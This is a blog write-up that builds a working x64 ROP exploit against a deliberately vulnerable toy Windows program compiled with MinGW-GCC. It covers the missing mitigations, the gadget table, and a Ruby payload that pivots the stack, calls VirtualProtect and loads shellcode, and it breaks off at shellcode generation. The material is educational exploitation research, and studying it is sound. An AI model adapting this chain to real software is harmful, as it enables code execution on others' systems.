<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>When exploit mitigations are disabled on modern systems :: Redouane — Interesting stuff related to Computer Science, Gaming or Whatever</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Table of Contents Introduction Prerequisites: Vulnerable program: Vulnerability Analysis of the executable Exploitation Initial plan Searching for ROP gadgets in the application Implementing the exploit Part1 - Initial Buffer overflow, stack pivoting Part2 - VirtualProtect the main module to ERW, scanf on ERW memory, and jump to it: Part3 - Final shellcode Putting it all together Conclusion Introduction While experimenting with the Windows exploit mitigation policies, I noticed that MinGW-GCC does not enable most of the modern protections by default."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://red0xff.github.io/posts/when_exploit_mitigations_are_disabled_on_modern_systems/" />

<link rel="stylesheet" href="https://red0xff.github.io/assets/reminder.css" />


<link rel="stylesheet" href="https://red0xff.github.io/assets/style.css">

  <link rel="stylesheet" href="https://red0xff.github.io/assets/blue.css">



<link rel="stylesheet" href="https://red0xff.github.io/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://red0xff.github.io/img/apple-touch-icon-144-precomposed.png">

<link rel="shortcut icon" href="https://red0xff.github.io/img/favicon/blue.png">



<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="When exploit mitigations are disabled on modern systems :: Redouane — Interesting stuff related to Computer Science, Gaming or Whatever" />
<meta name="twitter:description" content="Table of Contents Introduction Prerequisites: Vulnerable program: Vulnerability Analysis of the executable Exploitation Initial plan Searching for ROP gadgets in the application Implementing the exploit Part1 - Initial Buffer overflow, stack pivoting Part2 - VirtualProtect the main module to ERW, scanf on ERW memory, and jump to it: Part3 - Final shellcode Putting it all together Conclusion Introduction While experimenting with the Windows exploit mitigation policies, I noticed that MinGW-GCC does not enable most of the modern protections by default." />
<meta name="twitter:site" content="https://red0xff.github.io/" />
<meta name="twitter:creator" content="NIBOUCHA Redouane" />
<meta name="twitter:image" content="">


<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="When exploit mitigations are disabled on modern systems :: Redouane — Interesting stuff related to Computer Science, Gaming or Whatever">
<meta property="og:description" content="Table of Contents Introduction Prerequisites: Vulnerable program: Vulnerability Analysis of the executable Exploitation Initial plan Searching for ROP gadgets in the application Implementing the exploit Part1 - Initial Buffer overflow, stack pivoting Part2 - VirtualProtect the main module to ERW, scanf on ERW memory, and jump to it: Part3 - Final shellcode Putting it all together Conclusion Introduction While experimenting with the Windows exploit mitigation policies, I noticed that MinGW-GCC does not enable most of the modern protections by default." />
<meta property="og:url" content="https://red0xff.github.io/posts/when_exploit_mitigations_are_disabled_on_modern_systems/" />
<meta property="og:site_name" content="When exploit mitigations are disabled on modern systems" />
<meta property="og:image" content="">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">
<meta property="article:section" content="security" />
<meta property="article:published_time" content="2019-04-24 09:27:58 &#43;0200 CEST" />








</head>
<body class="">


<div class="container center">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Redouane&#39;s Blog
  </div>
</a>
<div id="typingcode" class="hidden"></div>
<div id="fences"></div>


    </div>
    <div class="menu-trigger">menu</div>
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about/">About</a></li>
        
      
        
          <li><a href="/posts/">Posts</a></li>
        
      
        
          <li><a href="/search/">Search</a></li>
        
      
        
          <li><a href="/writeups/">Writeups</a></li>
        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about/">About</a></li>
      
    
      
        <li><a href="/posts/">Posts</a></li>
      
    
      
        <li><a href="/search/">Search</a></li>
      
    
      
        <li><a href="/writeups/">Writeups</a></li>
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://red0xff.github.io/posts/when_exploit_mitigations_are_disabled_on_modern_systems/">When exploit mitigations are disabled on modern systems</a></h1>
  <div class="post-meta">
    <span class="post-date">
      2019-04-24
    </span>
    
    <span class="post-author">::
      NIBOUCHA Redouane
    </span>
    
  </div>
  
  <span class="post-tags">
    
    #<a href="https://red0xff.github.io/tags/windows/">windows</a>&nbsp;
    
    #<a href="https://red0xff.github.io/tags/buffer-overflow/">buffer overflow</a>&nbsp;
    
    #<a href="https://red0xff.github.io/tags/exploit/">exploit</a>&nbsp;
    
    #<a href="https://red0xff.github.io/tags/pwn/">pwn</a>&nbsp;
    
  </span>
  

  

  <div class="post-content">
    <h1 id="table-of-contents">Table of Contents</h1>
<ol>
<li><a href="#0b79795d3efc95b9976c7c5b933afce2">Introduction</a></li>
<li><a href="#d9a414100020a5250a8c1cc4fe4fbf37">Prerequisites:</a></li>
<li><a href="#a391333bf938bf9ac6f884a887f7f8e6">Vulnerable program:</a></li>
<li><a href="#ca548e0ecd399b3118e0727e6fe84100">Vulnerability</a></li>
<li><a href="#654d9d4621958b41749c55fa54f0e032">Analysis of the executable</a></li>
<li><a href="#5dfca85458757ffc49acbe67c9546cde">Exploitation</a>
<ol>
<li><a href="#cca9f36bb7bd3d87e8d39b01bb67ba2e">Initial plan</a></li>
<li><a href="#75fdf34c957cfbc1bd70fc84a6a0cdb6">Searching for ROP gadgets in the application</a></li>
<li><a href="#73fd64f500c535d97019722db89f60aa">Implementing the exploit</a>
<ol>
<li><a href="#a298d8e04dd735b71b9bbc699eb44eca">Part1 - Initial Buffer overflow, stack pivoting</a></li>
<li><a href="#1a2af3c8a6959c84c39768133b904836">Part2 - VirtualProtect the main module to ERW, scanf on ERW memory, and jump to it:</a></li>
<li><a href="#764f11b4fe208f39ad6e2c9506d74e81">Part3 - Final shellcode</a></li>
<li><a href="#b58f0e8ffb4d58f703a8c690da538bc7">Putting it all together</a></li>
</ol>
</li>
</ol>
</li>
<li><a href="#6f8b794f3246b0c1e1780bb4d4d5dc53">Conclusion</a></li>
</ol>
<h1 id="span-id0b79795d3efc95b9976c7c5b933afce2introductionspan"><span id='0b79795d3efc95b9976c7c5b933afce2'>Introduction</span></h1>
<p>While experimenting with the Windows exploit mitigation policies, I noticed that MinGW-GCC does not enable most of the modern protections by default.
<br/>
This post is more like a writeup, demonstrating an exploit that can be adapted to work on other vulnerable programs compiled with the same compiler, also, it does not require knowledge of the version of the Windows DLLs in use, or the virtual addresses where they are loaded.
<br/>
Tested on Windows 10 Professional, version <code>1803</code>
<br/>
gcc version <code>8.3.0</code> (Rev2, Built by MSYS2 project), latest at the time I am writing this.</p>
<h1 id="span-idd9a414100020a5250a8c1cc4fe4fbf37prerequisitesspan"><span id='d9a414100020a5250a8c1cc4fe4fbf37'>Prerequisites:</span></h1>
<ul>
<li>Basics of buffer overflow vulnerabilities</li>
<li>a basic understanding of Return Oriented Programming (ROP)</li>
</ul>
<h1 id="span-ida391333bf938bf9ac6f884a887f7f8e6vulnerable-programspan"><span id='a391333bf938bf9ac6f884a887f7f8e6'>Vulnerable program:</span></h1>
<p>Let&rsquo;s take a very simple program:</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;windows.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold"></span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">void</span> vuln()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#fff;font-weight:bold">char</span> name[<span style="color:#ff0;font-weight:bold">60</span>];
</span></span><span style="display:flex;"><span>	scanf(<span style="color:#0ff;font-weight:bold">&#34;%s&#34;</span>, &amp;name);
</span></span><span style="display:flex;"><span>	printf(<span style="color:#0ff;font-weight:bold">&#34;name = %s</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, name);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">int</span> main()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	setvbuf(stdout, <span style="color:#fff;font-weight:bold">NULL</span>, _IONBF, <span style="color:#ff0;font-weight:bold">0</span>); <span style="color:#007f7f">// disable stdout buffering
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>	printf(<span style="color:#0ff;font-weight:bold">&#34;--*   BOF EXPERIMENT 1 *--</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
</span></span><span style="display:flex;"><span>	vuln();
</span></span><span style="display:flex;"><span>	Sleep(<span style="color:#ff0;font-weight:bold">1</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>compile it with:</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gcc prog.c -o prog.exe
</span></span></code></pre></div><p>The compiled executable can be found <a href="/files/when_exploit_mitigations_are_disabled_on_modern_systems/prog.exe">here</a>.</p>
<h1 id="span-idca548e0ecd399b3118e0727e6fe84100vulnerabilityspan"><span id='ca548e0ecd399b3118e0727e6fe84100'>Vulnerability</span></h1>
<p>There is a clear vulnerability in the line <code>scanf(&quot;%s&quot;, &amp;name);</code>, because scanf doesn&rsquo;t know the size of the name buffer, it can read more than <code>60</code> character, thus overflowing the stack.
<br/>
This program, albeit vulnerable, shouldn&rsquo;t be exploitable on modern systems, a lot of effort has been put to mitigate memory corruption vulnerabilities, but surprisingly, it is!</p>
<h1 id="span-id654d9d4621958b41749c55fa54f0e032analysis-of-the-executablespan"><span id='654d9d4621958b41749c55fa54f0e032'>Analysis of the executable</span></h1>
<p>First, let&rsquo;s check the exploit mitigations enabled on the executable by running <code>Process Explorer</code> (from <code>sysinternals</code>).</p>
<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558110448/when_exploit_mitigations_are_disabled_on_modern_systems/no_aslr_rvkunt.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558110448/when_exploit_mitigations_are_disabled_on_modern_systems/no_aslr_rvkunt.png" alt="No ASLR"></a></p>
<p>Surprisingly, we notice that <code>ASLR</code> is not enabled, and it&rsquo;s the case for many other programs, this is already a big issue, this means that the imagebase of the main module (prog.exe) is fixed (and can be found in the headers).
<br/>
<code>DEP</code> is enabled.</p>
<p>By having a look at the import table, we also notice that the compiler has added imports we didn&rsquo;t reference from our code, one particularly interesting import is <code>VirtualProtect</code>, which is similar to the <code>mprotect</code> syscall on Linux (it changes the protections of pages of memory).</p>
<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558110438/when_exploit_mitigations_are_disabled_on_modern_systems/import_table_uisyi8.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558110438/when_exploit_mitigations_are_disabled_on_modern_systems/import_table_uisyi8.png" alt="Import Table"></a></p>
<p>Also, a quick check using <code>x64dbg</code> reveals that <code>SSP</code> protection is disabled.</p>
<div class="reminder">
<p><code>reminder</code> (click to expand)</p>
</div>
<div class="reminder-content">
<p><code>ASLR</code> stands for Address Space Layout Randomization, on Windows, it ensures that the module will be loaded at a dynamic virtual address that will change on each reboot.
<br/><code>DEP</code> stands for Data Execution Protection, it&rsquo;s a protection that ensures that the data sections (like the stack) are not executable, it prevents the classical buffer overflow attacks that overwrite the return address with the address of the user-controlled data, and execute shellcode directly.
<br/><code>SSP</code> (for Stack Smashing Protector) is a protection that aims to detect buffer overflows, each function starts by saving a random value (a cookie) on the stack right next to its saved base pointer, and when it&rsquo;s about to return, it checks if that value has changed, when a buffer overflow occurs, if the attacker doesn&rsquo;t know that random value, any stack overflow will be detected.</p>
</div>
<h1 id="span-id5dfca85458757ffc49acbe67c9546cdeexploitationspan"><span id='5dfca85458757ffc49acbe67c9546cde'>Exploitation</span></h1>
<h2 id="span-idcca9f36bb7bd3d87e8d39b01bb67ba2einitial-planspan"><span id='cca9f36bb7bd3d87e8d39b01bb67ba2e'>Initial plan</span></h2>
<p>Let&rsquo;s start by causing a crash, and finding the offset to the return address.</p>
<p>We will use <code>pattern_create</code> and <code>pattern_offset</code> from <code>metasploit-framework</code>.</p>
<pre tabindex="0"><code>ruby pattern_create.rb 200
=&gt; Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
</code></pre><p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558110445/when_exploit_mitigations_are_disabled_on_modern_systems/finding_offset_iem89u.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558110445/when_exploit_mitigations_are_disabled_on_modern_systems/finding_offset_iem89u.png" alt="Finding the offset to the return address"></a></p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ruby pattern_offset.rb <span style="color:#0ff;font-weight:bold">&#34;Ac4Ac5Ac&#34;</span>
</span></span><span style="display:flex;"><span>=&gt; <span style="color:#ff0;font-weight:bold">72</span>
</span></span></code></pre></div><p>okay, return address at offset <code>72</code>, let&rsquo;s elaborate an exploit plan.</p>
<p>First, we don&rsquo;t know how much memory we have on the stack to read our payload (<code>rsp</code> might leave the stack region while reading our payload), in order to make our exploit more reliable, we will <code>scanf</code> on a region that is <code>-RW</code> (<code>.bss</code> section for example), and then we will pivot the stack (make <code>rsp</code> point to that region instead).</p>
<p>Then, we will return to <code>VirtualProtect</code> to make sections on the main module <code>ERW</code>.</p>
<p>Finally, we will read our shellcode to the <code>ERW</code> memory, and we will jump to it.</p>
<p>Doing this is not straightforward, as <code>DEP</code> is enabled, we cannot execute our own code, we are obliged to reuse the existing code in the application, this is where ROP comes into play.</p>
<h2 id="span-id75fdf34c957cfbc1bd70fc84a6a0cdb6searching-for-rop-gadgets-in-the-applicationspan"><span id='75fdf34c957cfbc1bd70fc84a6a0cdb6'>Searching for ROP gadgets in the application</span></h2>
<p>We will use <code>rp++</code> to search for ROP gadgets in the <code>.text</code> section of the main module.</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>rp++ -f prog.exe -r <span style="color:#ff0;font-weight:bold">4</span> --unique
</span></span></code></pre></div><p>[<a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558110444/when_exploit_mitigations_are_disabled_on_modern_systems/rop_gadgets_otoerg.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558110444/when_exploit_mitigations_are_disabled_on_modern_systems/rop_gadgets_otoerg.png" alt="Rop Gadgets"></a></p>
<p>The gadgets we find particularly interesting are the following:</p>
<table>
<thead>
<tr>
<th style="text-align:center">Address</th>
<th style="text-align:center">Gadget</th>
<th style="text-align:center">Desired Effect</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0x004019cf</td>
<td style="text-align:center">pop rax ;<br/> ret</td>
<td style="text-align:center">Set rax to any value</td>
</tr>
<tr>
<td style="text-align:center">0x00402a1d</td>
<td style="text-align:center">test eax, eax ;<br/> cmovne rdx, r8 ;<br/> mov rax, rdx ;<br/> add rsp, 0x28 ;<br/> ret</td>
<td style="text-align:center">set rax = rdx = r8</td>
</tr>
<tr>
<td style="text-align:center">0x004010a4</td>
<td style="text-align:center">xor r8, rax ;<br/> add rsp, 0x28 ;<br/> ret</td>
<td style="text-align:center">set r8 = r8 ^ rax</td>
</tr>
<tr>
<td style="text-align:center">0x00402bc0</td>
<td style="text-align:center">pop rcx ;<br/> ret</td>
<td style="text-align:center">set rcx to any value</td>
</tr>
<tr>
<td style="text-align:center">0x004010a7</td>
<td style="text-align:center">add rsp, 0x28 ;<br/> ret</td>
<td style="text-align:center">clean shadow space</td>
</tr>
<tr>
<td style="text-align:center">0x0040172c</td>
<td style="text-align:center">pop rsp ;<br/> ret</td>
<td style="text-align:center">pivot the stack</td>
</tr>
<tr>
<td style="text-align:center">0x00402353</td>
<td style="text-align:center">jmp qword [rax]</td>
<td style="text-align:center">jmp to what a pointer points to</td>
</tr>
</tbody>
</table>
<div class="reminder">
<p><code>reminder</code> (click to expand)</p>
</div>
<div class="reminder-content">
<p><code>ROP</code> (Return Oriented Programming), is an exploitation technique commonly used to bypass <code>DEP</code>, since you can&rsquo;t execute shellcode directly, you carefully choose some instruction sequences that generally finish with <code>ret</code> or <code>jmp</code> from the <code>.text</code> section such that when you execute them sequentially, you get the effect you want, these sequences are called gadgets.
<br/>
The calling convention in use is <code>__fastcall</code>, first four arguments are passed in <code>rcx</code>,<code>rdx</code>,<code>r8</code>,<code>r9</code>, four qwords of shadowspace must also be allocated on the stack prior to the call (we will be using the gadget at <code>0x004010a7</code> to deallocate the shadowspace, because the function will not clean the stack for us).</p>
</div>
<h2 id="span-id73fd64f500c535d97019722db89f60aaimplementing-the-exploitspan"><span id='73fd64f500c535d97019722db89f60aa'>Implementing the exploit</span></h2>
<p>I split the exploit in multiple parts, to make it easier to follow.</p>
<p>Let&rsquo;s set some variables that will act as parameters in our payload.</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>fake_stack = <span style="color:#ff0;font-weight:bold">0x407100</span>; <span style="color:#007f7f"># in the .bss section</span>
</span></span><span style="display:flex;"><span>jmp_scanf = <span style="color:#ff0;font-weight:bold">0x402bf8</span>; <span style="color:#007f7f"># trampoline jmp to scanf</span>
</span></span><span style="display:flex;"><span>virtualprotect_ptr = <span style="color:#ff0;font-weight:bold">0x408294</span>; <span style="color:#007f7f"># address of the pointer to VirtualProtect that is in the import table</span>
</span></span></code></pre></div><p>I am representing the payload as an array of qwords, converting the array to a payload string is simple (refer to the whole exploit code for more informations).</p>
<h3 id="span-ida298d8e04dd735b71b9bbc699eb44ecapart1---initial-buffer-overflow-stack-pivotingspan"><span id='a298d8e04dd735b71b9bbc699eb44eca'>Part1 - Initial Buffer overflow, stack pivoting</span></h3>
<p>Because some gadgets end with <code>add rsp, 0x28;</code>, we will follow them with <code>[ 0 ] * (0x28 / 8)</code> (that is, 0x28/8=5 qwords), so that we get to the next gadget on the chain after executing them.</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#007f7f"># first thing to do : scanf(&#34;%s&#34;, fake_stack); rsp = fake_stack</span>
</span></span><span style="display:flex;"><span>part1 = [ <span style="color:#ff0;font-weight:bold">0x6161616161616161</span> ] * (<span style="color:#ff0;font-weight:bold">72</span>/<span style="color:#ff0;font-weight:bold">8</span>) <span style="color:#007f7f"># 72 bytes (72/8 qwords) to get to the return address</span>
</span></span><span style="display:flex;"><span>part1 += [ <span style="color:#ff0;font-weight:bold">0x004019cf</span>, <span style="color:#ff0;font-weight:bold">0xdeadbeefdeadbeef</span>, <span style="color:#ff0;font-weight:bold">0x00402a1d</span> ] + [ <span style="color:#ff0;font-weight:bold">0</span> ] * (<span style="color:#ff0;font-weight:bold">0x28</span>/<span style="color:#ff0;font-weight:bold">8</span>) <span style="color:#007f7f"># set rax = r8;</span>
</span></span><span style="display:flex;"><span>part1 += [ <span style="color:#ff0;font-weight:bold">0x004010a4</span> ] + [ <span style="color:#ff0;font-weight:bold">0</span> ] * (<span style="color:#ff0;font-weight:bold">0x28</span> / <span style="color:#ff0;font-weight:bold">8</span>) <span style="color:#007f7f"># set r8 = 0</span>
</span></span><span style="display:flex;"><span>part1 += [ <span style="color:#ff0;font-weight:bold">0x004019cf</span>, fake_stack, <span style="color:#ff0;font-weight:bold">0x004010a4</span> ] + [ <span style="color:#ff0;font-weight:bold">0</span> ] * (<span style="color:#ff0;font-weight:bold">0x28</span> / <span style="color:#ff0;font-weight:bold">8</span>) <span style="color:#007f7f"># set rax = fake_stack, set r8=fake_stack</span>
</span></span><span style="display:flex;"><span>part1 += [ <span style="color:#ff0;font-weight:bold">0x00402a1d</span> ] + [ <span style="color:#ff0;font-weight:bold">0</span> ] * (<span style="color:#ff0;font-weight:bold">0x28</span> / <span style="color:#ff0;font-weight:bold">8</span>) <span style="color:#007f7f"># set rdx = fake_stack</span>
</span></span><span style="display:flex;"><span>part1 += [ <span style="color:#ff0;font-weight:bold">0x00402bc0</span>, <span style="color:#ff0;font-weight:bold">0x404000</span>, jmp_scanf, <span style="color:#ff0;font-weight:bold">0x004010a7</span>, <span style="color:#ff0;font-weight:bold">0</span>, <span style="color:#ff0;font-weight:bold">0</span>, <span style="color:#ff0;font-weight:bold">0</span>, <span style="color:#ff0;font-weight:bold">0</span>, <span style="color:#ff0;font-weight:bold">0</span>, <span style="color:#ff0;font-weight:bold">0x0040172c</span>, fake_stack ] <span style="color:#007f7f"># set rcx = address of &#34;%s&#34;; scanf(rcx=&#34;%s&#34;,rdx=fake_stack); set rsp=fake_stack</span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f"># now, the stack will become fake_stack</span>
</span></span></code></pre></div><h3 id="span-id1a2af3c8a6959c84c39768133b904836part2---virtualprotect-the-main-module-to-erw-scanf-on-erw-memory-and-jump-to-itspan"><span id='1a2af3c8a6959c84c39768133b904836'>Part2 - VirtualProtect the main module to ERW, scanf on ERW memory, and jump to it:</span></h3>
<p>One challenge we face here is that we have no gadget to control the <code>r9</code> register, and we need it because <code>VirtualProtect</code> takes <code>4</code> arguments (fourth argument is just a pointer that retrieves the old protections).
Using <code>objdump</code>, and looking for instructions containing <code>r9</code>, we find this sequence:</p>
<p><a href="https://res.cloudinary.com/dik00g2mh/image/upload/v1558110440/when_exploit_mitigations_are_disabled_on_modern_systems/set_r9_b1dura.png"><img src="https://res.cloudinary.com/dik00g2mh/image/upload/v1558110440/when_exploit_mitigations_are_disabled_on_modern_systems/set_r9_b1dura.png" alt="Set R9"></a></p>
<p>Let&rsquo;s pick the gadget at <code>0x4027ff</code>, if we set <code>rcx = 0;</code> and <code>rax</code> such that <code>dword[rax+0xc] == 0</code> and <code>dword [rax+8] == 0;</code>, then it will have the effect : <code>r9 = rax+0x28;</code>, finding such a value for rax is simple enough, especially in a section like the <code>.bss</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#007f7f"># next thing to do : VirtualProtect(0x401000, 0x11000, 7, any_writable_address)</span>
</span></span><span style="display:flex;"><span>part2 = [ <span style="color:#ff0;font-weight:bold">0x004019cf</span>, <span style="color:#ff0;font-weight:bold">0x407400</span>, <span style="color:#ff0;font-weight:bold">0x00402bc0</span>, <span style="color:#ff0;font-weight:bold">0</span>, <span style="color:#ff0;font-weight:bold">0x4027ff</span> ] <span style="color:#007f7f"># set rax=0x407400; set rcx=0; set r9 = 0x407400 + 0x28</span>
</span></span><span style="display:flex;"><span>part2 += [ <span style="color:#ff0;font-weight:bold">0x004019cf</span>, <span style="color:#ff0;font-weight:bold">0xdeadbeefdeadbeef</span>, <span style="color:#ff0;font-weight:bold">0x00402a1d</span> ] + [ <span style="color:#ff0;font-weight:bold">0</span> ] * (<span style="color:#ff0;font-weight:bold">0x28</span>/<span style="color:#ff0;font-weight:bold">8</span>); <span style="color:#007f7f"># set rax = r8;</span>
</span></span><span style="display:flex;"><span>part2 += [ <span style="color:#ff0;font-weight:bold">0x004010a4</span> ] + [ <span style="color:#ff0;font-weight:bold">0</span> ] * (<span style="color:#ff0;font-weight:bold">0x28</span> / <span style="color:#ff0;font-weight:bold">8</span>) <span style="color:#007f7f"># set r8 = 0</span>
</span></span><span style="display:flex;"><span>part2 += [ <span style="color:#ff0;font-weight:bold">0x004019cf</span>, <span style="color:#ff0;font-weight:bold">0x11000</span>, <span style="color:#ff0;font-weight:bold">0x004010a4</span> ] + [ <span style="color:#ff0;font-weight:bold">0</span> ] * (<span style="color:#ff0;font-weight:bold">0x28</span> / <span style="color:#ff0;font-weight:bold">8</span>) <span style="color:#007f7f"># set rax = 0x11000; set r8 = 0x11000</span>
</span></span><span style="display:flex;"><span>part2 += [ <span style="color:#ff0;font-weight:bold">0x00402a1d</span> ] + [ <span style="color:#ff0;font-weight:bold">0</span> ] * (<span style="color:#ff0;font-weight:bold">0x28</span> / <span style="color:#ff0;font-weight:bold">8</span>) <span style="color:#007f7f"># set rdx = 0x11000</span>
</span></span><span style="display:flex;"><span>part2 += [ <span style="color:#ff0;font-weight:bold">0x004019cf</span>, <span style="color:#ff0;font-weight:bold">0x11000</span>^<span style="color:#ff0;font-weight:bold">0x40</span>, <span style="color:#ff0;font-weight:bold">0x004010a4</span>] + [ <span style="color:#ff0;font-weight:bold">0</span> ] * (<span style="color:#ff0;font-weight:bold">0x28</span> / <span style="color:#ff0;font-weight:bold">8</span>) <span style="color:#007f7f"># set rax=0x11000^0x40; set r8 = r8^rax = 0x40</span>
</span></span><span style="display:flex;"><span>part2 += [ <span style="color:#ff0;font-weight:bold">0x00402bc0</span>, <span style="color:#ff0;font-weight:bold">0x401000</span>, <span style="color:#ff0;font-weight:bold">0x004019cf</span>, virtualprotect_ptr, <span style="color:#ff0;font-weight:bold">0x00402353</span>, <span style="color:#ff0;font-weight:bold">0x004010a7</span>, <span style="color:#ff0;font-weight:bold">0</span>, <span style="color:#ff0;font-weight:bold">0</span>, <span style="color:#ff0;font-weight:bold">0</span>, <span style="color:#ff0;font-weight:bold">0</span>, <span style="color:#ff0;font-weight:bold">0</span> ] <span style="color:#007f7f"># set rcx=0x401000; set rax = virtualprotect_ptr; jmp [virtualprotect_ptr]</span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f"># now, 0x11000 bytes from 0x401000 should be ERW</span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f"># next thing to do : scanf(&#34;%s&#34;, 0x401000)</span>
</span></span><span style="display:flex;"><span>part2 += [ <span style="color:#ff0;font-weight:bold">0x004019cf</span>, <span style="color:#ff0;font-weight:bold">0xdeadbeefdeadbeef</span>, <span style="color:#ff0;font-weight:bold">0x00402a1d</span> ] + [ <span style="color:#ff0;font-weight:bold">0</span> ] * (<span style="color:#ff0;font-weight:bold">0x28</span>/<span style="color:#ff0;font-weight:bold">8</span>); <span style="color:#007f7f"># set rax = r8;</span>
</span></span><span style="display:flex;"><span>part2 += [ <span style="color:#ff0;font-weight:bold">0x004010a4</span> ] + [ <span style="color:#ff0;font-weight:bold">0</span> ] * (<span style="color:#ff0;font-weight:bold">0x28</span> / <span style="color:#ff0;font-weight:bold">8</span>) <span style="color:#007f7f"># set r8 = 0</span>
</span></span><span style="display:flex;"><span>part2 += [ <span style="color:#ff0;font-weight:bold">0x004019cf</span>, <span style="color:#ff0;font-weight:bold">0x401000</span>, <span style="color:#ff0;font-weight:bold">0x004010a4</span> ] + [ <span style="color:#ff0;font-weight:bold">0</span> ] * (<span style="color:#ff0;font-weight:bold">0x28</span> / <span style="color:#ff0;font-weight:bold">8</span>) <span style="color:#007f7f"># set rax = 0x401000; set r8 = 0x401000</span>
</span></span><span style="display:flex;"><span>part2 += [ <span style="color:#ff0;font-weight:bold">0x00402a1d</span> ] + [ <span style="color:#ff0;font-weight:bold">0</span> ] * (<span style="color:#ff0;font-weight:bold">0x28</span> / <span style="color:#ff0;font-weight:bold">8</span>) <span style="color:#007f7f"># set rdx = 0x401000</span>
</span></span><span style="display:flex;"><span>part2 += [ <span style="color:#ff0;font-weight:bold">0x00402bc0</span>, <span style="color:#ff0;font-weight:bold">0x404000</span>, jmp_scanf, <span style="color:#ff0;font-weight:bold">0x00401000</span> ] <span style="color:#007f7f"># set rcx = address of &#34;%s&#34;; scanf(rcx=&#34;%s&#34;,rdx=0x401000); return to 0x401000</span>
</span></span></code></pre></div><h3 id="span-id764f11b4fe208f39ad6e2c9506d74e81part3---final-shellcodespan"><span id='764f11b4fe208f39ad6e2c9506d74e81'>Part3 - Final shellcode</span></h3>
<p>Great! now, we can run any shellcode we want, the only constraint is that it must not contain whitespace characters (because scanf will stop reading input if it encounters such characters).</p>
<p>Let&rsquo;s just generate a shellcode that pops the Windows calculator with msfvenom (part of Metasploit Framework), <code>-b</code> stands for bad chars, an encoder will be used to avoid these whitespace characters.</p>
